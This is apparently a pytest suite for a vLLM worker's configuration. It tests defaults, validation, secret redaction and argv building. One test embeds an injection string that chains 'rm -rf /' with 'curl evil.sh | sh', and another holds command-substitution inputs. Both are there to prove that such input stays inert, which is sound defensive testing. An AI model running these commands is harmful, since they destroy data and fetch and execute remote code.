"""Configuration: defaults, validation, secret hygiene and argv construction."""

from __future__ import annotations

import shlex
from pathlib import Path

import pytest

from worker.config import (
    DEFAULT_MIN_FREE_DISK_GB,
    DEFAULT_MODEL_ID,
    DEFAULT_PERSISTENT_ROOT,
    ConfigError,
    PersistentLayout,
    Secret,
    WorkerConfig,
    resolve_tensor_parallel,
)

# ----------------------------------------------------------------------
# defaults
# ----------------------------------------------------------------------


def test_from_env_with_empty_environment_uses_documented_defaults() -> None:
    config = WorkerConfig.from_env({})

    assert config.model_id == DEFAULT_MODEL_ID
    assert config.model_revision is None
    assert config.served_model_name is None
    assert config.persistent_root == Path(DEFAULT_PERSISTENT_ROOT)
    assert config.min_free_disk_gb == DEFAULT_MIN_FREE_DISK_GB
    assert config.host == "0.0.0.0"  # noqa: S104 - a container binds every interface
    assert config.port == 8000
    assert config.max_model_len == 16384
    assert config.gpu_memory_utilization == 0.90
    assert config.tensor_parallel_size == 1
    assert config.auto_tensor_parallel is False
    assert config.extra_args == ()
    assert config.readiness_timeout_seconds == 1800.0
    assert config.readiness_poll_seconds == 3.0
    assert config.download_max_attempts == 5
    assert config.download_backoff_seconds == 5.0
    assert config.lock_timeout_seconds == 7200.0
    assert config.hf_hub_disable_xet is None
    assert not config.hf_token
    assert not config.vllm_api_key


def test_blank_and_whitespace_values_fall_back_to_defaults() -> None:
    config = WorkerConfig.from_env({"MODEL_ID": "   ", "MODEL_REVISION": "  ", "PORT": ""})

    assert config.model_id == DEFAULT_MODEL_ID
    assert config.model_revision is None
    assert config.port == 8000


def test_values_are_stripped_and_applied() -> None:
    config = WorkerConfig.from_env(
        {
            "MODEL_ID": "  acme/model  ",
            "MODEL_REVISION": " abc123 ",
            "SERVED_MODEL_NAME": "public-name",
            "PORT": "9001",
            "AUTO_TENSOR_PARALLEL": "yes",
            "HF_HUB_DISABLE_XET": "off",
        }
    )

    assert config.model_id == "acme/model"
    assert config.model_revision == "abc123"
    assert config.public_model_name == "public-name"
    assert config.port == 9001
    assert config.auto_tensor_parallel is True
    assert config.hf_hub_disable_xet is False


def test_hf_token_falls_back_to_the_legacy_variable() -> None:
    config = WorkerConfig.from_env({"HUGGING_FACE_HUB_TOKEN": "hf_legacy"})

    assert config.hf_token.reveal() == "hf_legacy"
    assert config.hub_environment()["HF_TOKEN"] == "hf_legacy"


def test_hub_environment_omits_the_token_when_unset() -> None:
    config = WorkerConfig.from_env({})

    assert "HF_TOKEN" not in config.hub_environment()
    assert "HF_HUB_DISABLE_XET" not in config.hub_environment()


def test_hub_environment_renders_the_xet_flag_as_one_or_zero() -> None:
    assert (
        WorkerConfig.from_env({"HF_HUB_DISABLE_XET": "1"}).hub_environment()["HF_HUB_DISABLE_XET"]
        == "1"
    )
    assert (
        WorkerConfig.from_env({"HF_HUB_DISABLE_XET": "no"}).hub_environment()["HF_HUB_DISABLE_XET"]
        == "0"
    )


# ----------------------------------------------------------------------
# every malformed variable names itself
# ----------------------------------------------------------------------


@pytest.mark.parametrize(
    ("variable", "value"),
    [
        ("PORT", "eight thousand"),
        ("MAX_MODEL_LEN", "1.5"),
        ("TENSOR_PARALLEL_SIZE", "many"),
        ("MODEL_DOWNLOAD_MAX_ATTEMPTS", "3.7"),
        ("MIN_FREE_DISK_GB", "lots"),
        ("GPU_MEMORY_UTILIZATION", "ninety percent"),
        ("READINESS_TIMEOUT_SECONDS", "forever"),
        ("READINESS_POLL_SECONDS", "often"),
        ("MODEL_DOWNLOAD_BACKOFF_SECONDS", "slow"),
        ("MODEL_LOCK_TIMEOUT_SECONDS", "ages"),
        ("AUTO_TENSOR_PARALLEL", "maybe"),
        ("HF_HUB_DISABLE_XET", "perhaps"),
        ("VLLM_EXTRA_ARGS", '--foo "unterminated'),
    ],
)
def test_unparsable_variable_names_itself_in_the_error(variable: str, value: str) -> None:
    with pytest.raises(ConfigError) as caught:
        WorkerConfig.from_env({variable: value})

    error = caught.value
    assert error.variable == variable
    assert variable in error.render()


@pytest.mark.parametrize(
    ("variable", "environ"),
    [
        ("GPU_MEMORY_UTILIZATION", {"GPU_MEMORY_UTILIZATION": "0"}),
        ("GPU_MEMORY_UTILIZATION", {"GPU_MEMORY_UTILIZATION": "1.5"}),
        ("GPU_MEMORY_UTILIZATION", {"GPU_MEMORY_UTILIZATION": "-0.5"}),
        ("MAX_MODEL_LEN", {"MAX_MODEL_LEN": "512"}),
        ("TENSOR_PARALLEL_SIZE", {"TENSOR_PARALLEL_SIZE": "0"}),
        ("PORT", {"PORT": "0"}),
        ("PORT", {"PORT": "65536"}),
        ("MIN_FREE_DISK_GB", {"MIN_FREE_DISK_GB": "-1"}),
        ("PERSISTENT_ROOT", {"PERSISTENT_ROOT": "relative/volume"}),
    ],
)
def test_out_of_range_variable_names_itself_in_the_error(
    variable: str, environ: dict[str, str]
) -> None:
    with pytest.raises(ConfigError) as caught:
        WorkerConfig.from_env(environ)

    assert caught.value.variable == variable


def test_empty_model_id_is_rejected_when_passed_directly() -> None:
    with pytest.raises(ConfigError) as caught:
        WorkerConfig(model_id="  ")

    assert caught.value.variable == "MODEL_ID"


def test_render_includes_the_variable_and_the_fix() -> None:
    with pytest.raises(ConfigError) as caught:
        WorkerConfig.from_env({"GPU_MEMORY_UTILIZATION": "2"})

    rendered = caught.value.render()
    assert "configuration error:" in rendered
    assert "variable: GPU_MEMORY_UTILIZATION" in rendered
    assert "fix:" in rendered


def test_boolean_flag_accepts_every_documented_spelling() -> None:
    for truthy in ("1", "true", "TRUE", "Yes", "on"):
        assert WorkerConfig.from_env({"AUTO_TENSOR_PARALLEL": truthy}).auto_tensor_parallel is True
    for falsy in ("0", "false", "No", "OFF"):
        assert WorkerConfig.from_env({"AUTO_TENSOR_PARALLEL": falsy}).auto_tensor_parallel is False


# ----------------------------------------------------------------------
# VLLM_EXTRA_ARGS: shlex splits, nothing expands
# ----------------------------------------------------------------------


def test_extra_args_respect_quoting() -> None:
    config = WorkerConfig.from_env(
        {"VLLM_EXTRA_ARGS": "--enable-prefix-caching --tool-call-parser \"hermes two\" --x='a b'"}
    )

    assert config.extra_args == (
        "--enable-prefix-caching",
        "--tool-call-parser",
        "hermes two",
        "--x=a b",
    )


def test_extra_args_do_not_expand_anything() -> None:
    """Globs, variables and command substitution survive as inert text."""
    config = WorkerConfig.from_env(
        {"VLLM_EXTRA_ARGS": "--a $HOME --b ~ --c * --d $(whoami) --e `id`"}
    )

    assert config.extra_args == (
        "--a",
        "$HOME",
        "--b",
        "~",
        "--c",
        "*",
        "--d",
        "$(whoami)",
        "--e",
        "`id`",
    )


def test_shell_injection_attempt_becomes_inert_words() -> None:
    """``; rm -rf /`` must land in argv as ordinary words, never as a command."""
    config = WorkerConfig.from_env(
        {"VLLM_EXTRA_ARGS": "--enable-prefix-caching; rm -rf / && curl evil.sh | sh"}
    )

    assert config.extra_args == (
        "--enable-prefix-caching;",
        "rm",
        "-rf",
        "/",
        "&&",
        "curl",
        "evil.sh",
        "|",
        "sh",
    )

    argv = config.vllm_argv()
    # argv is a list of words handed to execve, not a string handed to a shell:
    # no element is ever a compound command.
    assert argv[0] == "vllm"
    assert "; rm -rf /" not in argv
    assert argv[-len(config.extra_args) :] == list(config.extra_args)


# ----------------------------------------------------------------------
# secrets
# ----------------------------------------------------------------------

SECRET_VALUE = "hf_thisMustNeverBeLogged"


def test_secret_never_renders_its_value() -> None:
    secret = Secret(SECRET_VALUE)

    assert repr(secret) == "Secret(set)"
    assert str(secret) == "Secret(set)"
    assert f"{secret}" == "Secret(set)"
    assert SECRET_VALUE not in repr(secret)
    assert secret.reveal() == SECRET_VALUE
    assert bool(secret) is True


def test_unset_secret_is_falsy_and_reveals_the_empty_string() -> None:
    secret = Secret(None)

    assert bool(secret) is False
    assert secret.reveal() == ""
    assert repr(secret) == "Secret(unset)"


def test_secret_stays_hidden_inside_an_exception_message() -> None:
    secret = Secret(SECRET_VALUE)
    error = ConfigError(f"could not authenticate with {secret}", variable="HF_TOKEN")

    assert SECRET_VALUE not in str(error)
    assert SECRET_VALUE not in repr(error)
    assert SECRET_VALUE not in error.render()


def test_config_repr_and_banner_hide_both_secrets() -> None:
    config = WorkerConfig.from_env({"HF_TOKEN": SECRET_VALUE, "VLLM_API_KEY": "sk-live-1234"})

    rendered = repr(config) + "\n".join(config.describe())
    assert SECRET_VALUE not in rendered
    assert "sk-live-1234" not in rendered
    assert "api key                set" in config.describe()
    assert "hf token               set" in config.describe()


def test_banner_announces_an_open_port_when_no_api_key_is_set() -> None:
    lines = WorkerConfig.from_env({}).describe()

    assert any("NOT SET (open port)" in line for line in lines)
    assert any("unpinned (resolves to main)" in line for line in lines)


# ----------------------------------------------------------------------
# argv
# ----------------------------------------------------------------------


def test_vllm_argv_carries_every_serving_decision() -> None:
    config = WorkerConfig.from_env(
        {
            "MODEL_ID": "acme/model",
            "SERVED_MODEL_NAME": "acme-public",
            "HOST": "0.0.0.0",  # noqa: S104
            "PORT": "8123",
            "MAX_MODEL_LEN": "32768",
            "GPU_MEMORY_UTILIZATION": "0.85",
            "TENSOR_PARALLEL_SIZE": "2",
        }
    )

    assert config.vllm_argv() == [
        "vllm",
        "serve",
        "acme/model",
        "--host",
        "0.0.0.0",  # noqa: S104
        "--port",
        "8123",
        "--served-model-name",
        "acme-public",
        "--max-model-len",
        "32768",
        "--gpu-memory-utilization",
        "0.85",
        "--tensor-parallel-size",
        "2",
    ]


def test_revision_is_passed_only_when_there_is_no_local_snapshot() -> None:
    config = WorkerConfig.from_env({"MODEL_ID": "acme/model", "MODEL_REVISION": "abc123"})

    remote = config.vllm_argv()
    assert remote[remote.index("--revision") + 1] == "abc123"
    assert remote[2] == "acme/model"

    local = config.vllm_argv("/runpod-volume/huggingface/hub/snapshots/abc123")
    assert "--revision" not in local
    assert local[2] == "/runpod-volume/huggingface/hub/snapshots/abc123"


def test_a_local_path_object_is_stringified() -> None:
    config = WorkerConfig.from_env({})

    assert config.vllm_argv(Path("/volume/snapshot"))[2] == "/volume/snapshot"


def test_no_revision_flag_when_the_revision_is_unpinned() -> None:
    assert "--revision" not in WorkerConfig.from_env({}).vllm_argv()


def test_extra_args_are_appended_last_and_untouched() -> None:
    config = WorkerConfig.from_env({"VLLM_EXTRA_ARGS": "--enable-prefix-caching --seed 7"})

    assert config.vllm_argv()[-3:] == ["--enable-prefix-caching", "--seed", "7"]


def test_redacted_argv_masks_only_the_key() -> None:
    config = WorkerConfig.from_env(
        {"VLLM_API_KEY": "sk-live-1234", "VLLM_EXTRA_ARGS": "--enable-prefix-caching"}
    )

    clear = config.vllm_argv()
    redacted = config.redacted_argv()

    assert clear[clear.index("--api-key") + 1] == "sk-live-1234"
    assert redacted[redacted.index("--api-key") + 1] == "***"
    assert "sk-live-1234" not in redacted
    # Everything but the one masked word is identical.
    index = clear.index("--api-key") + 1
    assert clear[:index] == redacted[:index]
    assert clear[index + 1 :] == redacted[index + 1 :]
    assert redacted[-1] == "--enable-prefix-caching"


def test_redacted_argv_is_a_noop_without_a_key() -> None:
    config = WorkerConfig.from_env({})

    assert config.redacted_argv() == config.vllm_argv()
    assert "--api-key" not in config.vllm_argv()


def test_redacted_argv_does_not_mutate_the_clear_vector() -> None:
    config = WorkerConfig.from_env({"VLLM_API_KEY": "sk-live-1234"})

    config.redacted_argv()
    assert "sk-live-1234" in config.vllm_argv()


def test_gpu_memory_utilization_is_rendered_without_trailing_zeros() -> None:
    config = WorkerConfig.from_env({"GPU_MEMORY_UTILIZATION": "0.90"})

    argv = config.vllm_argv()
    assert argv[argv.index("--gpu-memory-utilization") + 1] == "0.9"


def test_argv_words_never_need_shell_quoting_to_round_trip() -> None:
    config = WorkerConfig.from_env({"VLLM_EXTRA_ARGS": '--chat-template "a b"'})
    argv = config.vllm_argv()

    assert shlex.split(shlex.join(argv)) == argv


# ----------------------------------------------------------------------
# derived values
# ----------------------------------------------------------------------


@pytest.mark.parametrize(
    ("host", "expected"),
    [
        ("0.0.0.0", "http://127.0.0.1:8000"),  # noqa: S104
        ("::", "http://127.0.0.1:8000"),
        ("127.0.0.1", "http://127.0.0.1:8000"),
        ("vllm.internal", "http://vllm.internal:8000"),
    ],
)
def test_base_url_translates_a_wildcard_bind_to_the_loopback(host: str, expected: str) -> None:
    assert WorkerConfig.from_env({"HOST": host}).base_url == expected


def test_base_url_follows_the_port() -> None:
    assert WorkerConfig.from_env({"PORT": "9999"}).base_url == "http://127.0.0.1:9999"


def test_public_model_name_defaults_to_the_model_id() -> None:
    assert WorkerConfig.from_env({"MODEL_ID": "acme/model"}).public_model_name == "acme/model"


# ----------------------------------------------------------------------
# tensor parallelism
# ----------------------------------------------------------------------


def test_manual_tensor_parallel_ignores_the_visible_gpus() -> None:
    config = WorkerConfig.from_env({"TENSOR_PARALLEL_SIZE": "2"})

    assert resolve_tensor_parallel(config, []) == 2
    assert resolve_tensor_parallel(config, [object(), object(), object(), object()]) == 2


def test_auto_tensor_parallel_counts_the_visible_gpus() -> None:
    config = WorkerConfig.from_env({"AUTO_TENSOR_PARALLEL": "1", "TENSOR_PARALLEL_SIZE": "1"})

    assert resolve_tensor_parallel(config, [object(), object()]) == 2
    assert resolve_tensor_parallel(config, [object()]) == 1


def test_auto_tensor_parallel_never_returns_zero() -> None:
    config = WorkerConfig.from_env({"AUTO_TENSOR_PARALLEL": "true"})

    assert resolve_tensor_parallel(config, []) == 1


# ----------------------------------------------------------------------
# layout
# ----------------------------------------------------------------------


def test_every_directory_is_derived_from_the_root() -> None:
    layout = PersistentLayout(Path("/volume"))

    for directory in layout.all_directories():
        assert directory.is_relative_to(Path("/volume"))
    assert layout.model_ready_marker == Path("/volume/state/model-ready.json")
    assert layout.download_lock == Path("/volume/state/model-download.lock")
    assert layout.hub_cache == Path("/volume/huggingface/hub")


def test_layout_directories_are_unique() -> None:
    directories = PersistentLayout(Path("/volume")).all_directories()

    assert len(set(directories)) == len(directories)


def test_cache_environment_points_every_library_at_the_volume() -> None:
    environment = PersistentLayout(Path("/volume")).environment()

    assert environment == {
        "HF_HOME": "/volume/huggingface",
        "HUGGINGFACE_HUB_CACHE": "/volume/huggingface/hub",
        "HF_HUB_CACHE": "/volume/huggingface/hub",
        "VLLM_CACHE_ROOT": "/volume/vllm",
        "TORCH_HOME": "/volume/torch",
        "TMPDIR": "/volume/tmp",
        "XDG_CACHE_HOME": "/volume/xdg",
        "TRITON_CACHE_DIR": "/volume/vllm/triton",
    }


def test_config_layout_follows_persistent_root() -> None:
    config = WorkerConfig.from_env({"PERSISTENT_ROOT": "/mnt/other"})

    assert config.layout.root == Path("/mnt/other")
    assert config.layout.models == Path("/mnt/other/models")


def test_a_config_error_without_a_variable_renders_just_the_message() -> None:
    assert ConfigError("something is off").render() == "configuration error: something is off"


def test_a_zero_attempt_budget_is_rejected_at_boot() -> None:
    with pytest.raises(ConfigError) as caught:
        WorkerConfig.from_env({"MODEL_DOWNLOAD_MAX_ATTEMPTS": "0"})

    assert caught.value.variable == "MODEL_DOWNLOAD_MAX_ATTEMPTS"
